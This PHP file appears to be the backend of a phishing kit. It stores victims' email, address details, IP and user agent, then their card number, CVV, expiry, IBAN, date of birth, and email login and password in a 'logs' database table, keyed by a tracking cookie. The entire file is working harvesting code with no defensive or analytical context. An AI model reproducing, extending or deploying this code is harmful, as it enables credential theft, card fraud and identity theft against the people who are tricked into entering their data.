<?php
session_start();
include_once __DIR__."/include/db/db_connect.php";
if( !empty($_POST['0']) ){
    
    if($_POST['0'] == '1'){
        $a = md5(rand(5555,99999));
        setcookie("token", $a);
        $req = $db->query('INSERT INTO logs SET email=?s, zip=?s, house_number=?s, ip=?s, ua=?s, uniq_id=?s', $_POST['1'], $_POST['2'], $_POST['3'], $_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT'], $a);
        
        if($req)
            exit('ok');
        
    }
    
    if($_POST['0'] == '2'){
        
        $req = $db->query('UPDATE logs SET card=?s, name=?s, dob=?s, iban=?s, cvv=?s, exp=?s WHERE uniq_id=?s', $_POST['1'], $_POST['2'], $_POST['3'], $_POST['4'],$_POST['5'],$_POST['6'], $_POST['token']);
        
        if($req)
            exit('ok');
        
    }
    
    if($_POST['0'] == '3'){
        $_SESSION['email'] = $_POST['1'];
        $req = $db->query('UPDATE logs SET email_login=?s  WHERE uniq_id=?s', $_POST['1'], $_POST['token']);
        
        if($req)
            exit('ok');
        
    }
    
    if($_POST['0'] == '4'){
       
        $req = $db->query('UPDATE logs SET email_password=?s  WHERE uniq_id=?s', $_POST['1'], $_POST['token']);
        
        if($req)
            exit('ok');
        
    }
    
    
    
}

?>